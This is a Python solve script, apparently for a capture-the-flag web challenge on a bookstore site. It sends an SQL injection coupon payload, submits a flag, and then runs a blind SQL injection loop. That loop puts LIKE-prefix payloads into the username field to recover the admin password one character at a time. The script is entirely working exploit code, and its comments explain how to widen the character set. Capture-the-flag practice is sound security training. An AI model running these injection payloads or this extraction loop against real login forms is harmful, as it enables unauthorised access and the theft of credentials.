import requests

# This creates a session object that has the first 3 tasks completed already.
# You could also set a cookie on the session object that matches your cookie instead.
session = requests.Session()
session.post("https://books.umdctf.io/book", data={"book": "0"})
session.post("https://books.umdctf.io/coupon", data={"code": "' OR discount >= 100; --"})
session.post("https://books.umdctf.io/order/confirm", data={"0": "flag{teach_me_cryptography_clam}"})

# In practice, we would probably use a larger character set including numbers, uppercase letters, and symbols; but in this case we can get away with a smaller one.
# Note that we place _ at the end because it's a wildcard that will match any single character.
charset = '{}abcdefghijklmnopqrstuvwxyz_'

# This will represent the known prefix of the admin password.
known = ''

while 1:
	for nextchar in charset:
		print(f"Trying {known + nextchar}")
		response = session.post("https://books.umdctf.io/login", data={
			# Check if the password starts with the current prefix + the current character
			"username": f"admin' AND password LIKE '{known + nextchar}%'; --",
			"password": ""
		}).text
		if "Invalid username or password" in response:
			# This character worked, add it to the end of our known prefix
			known += nextchar
			break
	else:
		# We couldn't find a next character that worked, so we've probably hit the end
		print(f"Found password: {known}")
		break